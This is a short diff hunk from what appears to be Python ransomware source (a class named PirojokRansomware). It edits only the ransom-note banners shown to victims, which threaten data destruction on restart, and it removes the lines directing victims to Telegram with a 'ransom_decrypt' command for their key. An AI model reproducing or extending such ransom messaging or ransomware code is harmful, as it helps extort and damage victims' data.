@@ -1025,7 +1025,6 @@ class PirojokRansomware:
 ║   DO NOT TRY TO RESTART YOUR COMPUTER                        ║
 ║   OTHERWISE IT WILL DESTROY YOUR DATA                        ║
 ║                                                              ║
-║   Check Telegram for decryption key                          ║
 ║                                                              ║
 ╚══════════════════════════════════════════════════════════════╝
             """
@@ -1131,11 +1130,6 @@ pause > nul
 ║                                                              ║
 ║   DO NOT TRY TO RESTART YOUR COMPUTER                        ║
 ║   Otherwise your data will be destroyed                      ║
-║                                                              ║
-║   To recover your files, send this command to Telegram:      ║
-║   ransom_decrypt {key_b64}                                   ║
-║                                                              ║
-║   Or use: ransom_key to get the key again                    ║
 ║                                                              ║
 ╚══════════════════════════════════════════════════════════════╝
         """
